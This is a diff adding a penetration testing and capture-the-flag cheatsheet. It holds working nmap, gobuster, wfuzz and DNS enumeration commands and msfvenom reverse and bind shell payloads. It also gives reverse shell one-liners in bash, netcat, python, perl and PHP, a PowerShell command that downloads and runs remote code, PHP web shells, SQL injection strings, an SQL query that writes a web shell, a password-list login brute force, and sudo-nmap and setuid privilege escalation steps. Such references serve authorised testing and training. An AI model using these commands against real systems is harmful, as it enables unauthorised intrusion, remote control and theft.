@@ -1,0 +1,436 @@
+Pentesting and CTF Cheatsheet
+Overview
+
+A catalog of tools and techniques used for penetration testing and capture the flag. Nothing special, just a useful reference.
+Enumeration
+Nmap
+
+Common Nmap scans.
+Full TCP Port Scan
+
+nmap -v -p- -sV -sS -sC -T4 -oN full-target.scan <target>
+
+    Options: verbose, all ports, Service detection, TCP SYN, default scripts, set timing template (Aggressive) and output to file in normal format
+
+nmap -v -p- -sV -sT -sC -T3 -oN full-target.scan <target>
+
+    Options: -v, all ports, Service detection, TCP connect, default scripts, set timing template (Normal) and output to file in grepable format
+
+Common UDP Port Scan
+
+nmap -sU -PN -n -p 0-1024 <target> -sV
+
+    Options: UDP scan, treat all hosts online, never do DNS resolution, ports 0-1024 and service detection.
+
+thx @stevelord via rawhex.com
+OneTwoPunch
+
+Use unicornscan to quickly scan all open ports, and then pass the open ports to nmap for detailed scans onetwopunch
+
+./onetwopunch.sh -t <file> -p all -i tap0 -n -A
+
+    Options: target file, all ports, interface, nmap options of All (Enable OS detection, version detection, script scanning, and traceroute)
+
+thx @superkojiman via superkojiman
+Web Scanning
+WordLists
+
+SecLists - https://github.com/danielmiessler/SecLists
+Gobuster
+
+Gobuster - https://github.com/OJ/gobuster
+
+Gobuster quick directory busting
+
+gobuster -u <host> -w /home/wakeward/src/SecLists/Discovery/Web-Content/common.txt -t 10 -a Wakeward
+
+    Options: Host and port, default wordlist, number of threads and user agent string
+
+Gobuster search with file extension
+
+gobuster -u <host> -w /home/wakeward/src/SecLists/Discovery/Web-Content/common.txt -t 10 -a Wakeward -x .txt,.php
+
+    Options: Host and port, wordlist (SecLists), number of threads, user agent string, file extensions
+
+Gobuster comprehensive directory busting
+
+gobuster -s 200,204,301,302,307,403 -u 10.10.10.10 -w /usr/share/dirbuster/wordlist/directory -t 10 -a Wakeward
+
+    Options: valid codes, host and port, wordlist (dirbuster), number of threads, user agent string, file extensions
+
+thx @scund00r via scund00r.com
+Dirb / Dirbuster
+
+Dirb and Dirbuster are decent but majority of security folks have moved over to Gobuster.
+
+dirb http://<host:port>
+
+    Options: Host and port, default wordlist
+
+dirb http://<host:port> /home/wakeward/src/SecLists/Discovery/Web-Content/common.txt -X '.php,.txt,.html'  
+
+    Options: Host and port, wordlist (SecLists) and file extensions
+
+Wfuzz
+
+Wfuzz is adaptable and useful for false positives such as http status code returning "200 OK" when a resource is not present.
+
+wfuzz -c -z file,/home/wakeward/src/SecLists/Discovery/Web-Content/common.txt --hc 404 -R 2 http://<host>/FUZZ.php
+
+    Options: output in colours, payload for each FUZZ keyword, hide specific response codes, depth of 2
+
+wfuzz -c -z file,/home/wakeward/src/SecLists/Passwords/darkweb2017-top10000.txt --hc 200 -d "username=tyler&password=FUZZ" http://10.10.10.97/login.php
+
+    Options: output in colours, payload for each FUZZ keyword, hide specific response codes, post data.
+
+Nikto
+
+nikto --host <host> --port <port> 
+
+    Options: host and port only
+
+nikto --host <host> --port <port>,<port> --ssl 
+
+    Options: host, mulitple ports and https
+
+SMB
+Enum4Linux
+
+Enum4linux is a tool for enumerating information from Windows and Samba systems.
+
+enum4linux -U -o <host>
+
+    Options: userlist and OS information
+
+enum4linux -a <host>
+
+    Options: Do all simple enumeration
+
+Smbclient
+
+Ftp-like client to access SMB/CIFS resources on servers
+
+smbclient -L <host> -N
+
+    Options: Connect to a default SMB resource with no password
+
+smbclient -L <host> -U admin
+
+    Options: Connect to default SMB resource with admin user
+
+smbclient \\\\<host>\\"Admin$" -U admin
+
+    Options: Connect to a specific SMB resource with admin user
+
+Rpcclient
+
+Connect to host and execute MS-RPC functions
+
+rpcclient -U "" <host>
+
+    Options: connect with user
+
+SNMP
+Snmpwalk
+
+Snmpwalk is an SNMP application that uses SNMP GETNEXT requests to query a network entity for a tree of information.
+
+snmpwalk -c public -v 1 -r <host> -p <port>
+
+    Options: SNMP community string, SNMP version (1, 2c, 3)
+
+DNS
+Host
+
+Host is a simple utility for performing DNS lookups.
+
+host -t ns <fqdn>
+
+    Options: Query type for different DNS records (E.g. CNAME, NS, AXFR)
+
+host -l <fqdn> <dns server address> 
+
+    Options: DNS zone transfer for zone name
+
+Dig
+
+Dig can query DNS name servers for DNS lookup related tasks.
+
+dig <fqdn> -t MX
+
+    Options: DNS MX record query
+
+dig <fqdn> -t ANY
+
+    Options: View all DNS Records
+
+dig -x <ip-address>
+
+    Options: DNS Reverse Lookup
+
+DNS Recon
+
+DNSRecon is a python script for DNS enumeration.
+
+dnsrecon -d <fqdn> -t axfr 
+
+    Options: Test all NS Servers in a domain for misconfigured zone transfers
+
+dnsrecon -d <fqdn> -s
+
+    Options: Perform Reverse Lookup against all ranges in SPF records
+
+dnsrecon -d <fqdn> -t std
+
+    Options: Test multiple records on the nameserver
+
+Shells
+Msfvenom
+
+msfvenom --payload-options
+
+    Options: lists the payload options for msfvenom
+
+Non-Staged
+
+msfvenom -a x86 --platform linux -p linux/x86/shell_reverse_tcp LHOST=<host> LPORT=<port> -b "\x00" -f elf -o non_staged_reverse_tcp
+
+    Options: 32bit architecture, linux platform, linux reverse shell payload, local host, local port, bad characters, shell format (elf), output to file
+
+Staged
+
+msfvenom -a x86 --platform linux -p linux/x86/shell/reverse_tcp LHOST=<host> LPORT=<port> -b "\x00" -f elf -o staged_reverse_tcp
+
+    Options: 32bit architecture, linux platform, linux reverse shell payload, local host, local port, bad characters, shell format (elf), output to file
+
+Linux Reverse Shell
+
+msfvenom -a x86 --platform linux -p linux/x86/shell/reverse_tcp LHOST=192.168.1.101 LPORT=<port> -b "\x00" -f elf -o rs
+
+Perl
+
+msfvenom -a x86 --platform linux -p linux/x86/shell_reverse_tcp LHOST=<host> LPORT=<port> -b "\x00" -f perl -o plrs.pl
+
+Javascript
+
+msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.11.0.60 LPORT=<port> -f js_le
+
+    Options: 32bit architecture little endian
+
+Windows Meterpreter
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<host> LPORT=<port> -b "\x00" -f exe -o sheep.exe
+
+    Options: windows meterpreter reverse shell payload, local host, local port, bad characters, shell format (exe), output to file
+
+Windows Reverse Shell
+
+msfvenom -p windows/shell_reverse_tcp LHOST=<host> LPORT=<port> -e x86/shikata_ga_nai -b "\x00" -f c 
+
+    Options: windows reverse shell payload, local host, local port, encode payload, bad characters, shell format (c)
+
+Windows Bind Shell
+
+msfvenom -p windows/shell_bind_tcp LHOST=<host> LPORT=<port> -e x86/shikata_ga_nai -b "\x00" -f c 
+
+    Options: windows bind shell payload, local host, local port, encode payload, bad characters, shell format (c)
+
+ASP
+
+msfvenom -a x86 --platform window -p windows/meterpreter/reverse_tcp LHOST=<host> LPORT=<port> -f asp -o hello.asp
+
+    Options: 32bit architecture, windows platform, windows reverse shell payload, local host, local port, bad characters, shell format (asp), output to file
+
+Reverse Shells
+
+thx @pentestmonkey via pentestmonkey.net
+Bash
+
+/bin/bash -i > /dev/tcp/<host>/<port> 0<&1 2>&1
+
+PHP
+
+<?php echo system($_REQUEST['wakeward']); ?>
+
+<?php echo shell_exec($_REQUEST['wakeward']); ?>
+
+php -r '$sock=fsockopen("<host>",<port>);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+Netcat
+
+nc -e /bin/sh <host> <port>
+
+If option -e is not available
+
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <host> <port> >/tmp/f
+
+Python
+
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<host>",<port>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+Perl
+
+perl -e 'use Socket;$i=<host>;$p=<port>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+
+Powershell
+
+powershell "IEX(New-Object Net.WebClient).downloadString('http://<host>.ps1')"
+
+SSH
+Port Forwarding
+Local Port Forwarding
+
+ssh -L <local port to listen>:<remote host>:<remote port> <localhost>
+
+Remote Port Forwarding
+
+ssh -R <remote port to bind>:127.0.0.1:<local port> <user@><local host>
+
+SQL Injection (SQLi)
+MySQL
+
+These are simple MySQL commands to obtain users and passwords.
+Login
+
+mysql -host <host> -u <username> -p<password>
+Enter Password: 
+mysql>
+
+Database Users and Passwords
+
+SHOW DATABASES;
+USE DBNAME;
+SHOW TABLES;
+SELECT user,host,password FROM users;
+
+Sqlmap
+sqlmap crawl
+
+sqlmap -u http://<host> --crawl=1
+
+sqlmap dump database
+
+sqlmap -u http://<host> --dbms=mysql --dump
+
+sqlmap shell
+
+sqlmap -u http://<host> --dbms=mysql --os-shell
+
+Manual Methods
+
+admin' --
+admin' #
+admin'/*
+' or 1=1--
+' or 1=1#
+' or 1=1/*
+') or '1'='1--
+') or ('1'='1--
+
+Reverse Shell
+
+SELECT "<?php echo exec ($_GET['wakeward']);?>" into outfile "/tmp/reverse_shell.php" --
+
+Local Recon
+Local Interactive Shell
+
+# on the remote host
+python -c 'import pty; pty.spawn("/bin/bash")'
+
+FTP
+
+Download a file from the remote host
+
+echo open <host> <port> > ftp.txt
+echo USER <username> >> ftp.txt
+echo <password> >> ftp.txt
+echo bin >> ftp.txt
+echo GET <file> >> ftp.txt
+echo bye >> ftp.txt
+ftp -v -n -s:ftp.txt
+
+Upload a file to the remote host
+
+echo open <host> <port> > ftp.txt
+echo USER <username> >> ftp.txt
+echo <password> >> ftp.txt
+echo bin >> ftp.txt
+echo PUT <file> >> ftp.txt
+echo bye >> ftp.txt
+ftp -v -n -s:ftp.txt
+
+Windows Useful Commands
+Host discovery with only ping
+
+FOR /L %i in (1,1,255) do @ping -n 1 10.1.1.%i | find "Reply"
+
+Finding files
+
+Hidden Files
+
+dir /ah
+
+Files within Subfolders
+
+dir <file> /s /p
+
+Adding a new local admin
+
+net user /add [username] [password]
+net localgroup administrators [username] /add 
+
+Linux Useful Commands
+
+find . -name <file> 
+
+Privilege Escalation
+Linux
+Resources
+
+    g0tmi1k - https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
+    Linux Privilege Checker Script - https://github.com/sleventyeleven/linuxprivchecker/blob/master/linuxprivchecker.py
+    Linux Enumeration Script - https://github.com/rebootuser/LinEnum
+
+Sudo
+
+sudo nmap --interactive
+
+Starting Nmap V. 4.11 ( http://www.insecure.org/nmap/ )
+Welcome to Interactive Mode -- press h <enter> for help
+nmap> !sh
+
+Setuid Technique
+
+Create a c file on the remote host
+
+#include <stdio.h>
+#include <sys/types.h>
+#include <unistd.h>
+
+int main(void)
+{
+	setuid(0);
+	setgid(0);
+	system('/bin/bash');
+}
+
+Compile the c file
+
+gcc setuid.c -o pwn
+chmod 4755 /tmp/pwn
+
+Windows
+Resources
+
+    FuzzySecurity - http://www.fuzzysecurity.com/tutorials/16.html
+    sushant747 - https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html
+
+Powershell
+
+    Nishang - https://github.com/samratashok/nishang
+    PowerSploit - https://github.com/PowerShellMafia/PowerSploit/
+
+Vulnerability Checking
+
+    Sherlock - https://github.com/rasta-mouse/Sherlock
+    Watson - https://github.com/rasta-mouse/Watson
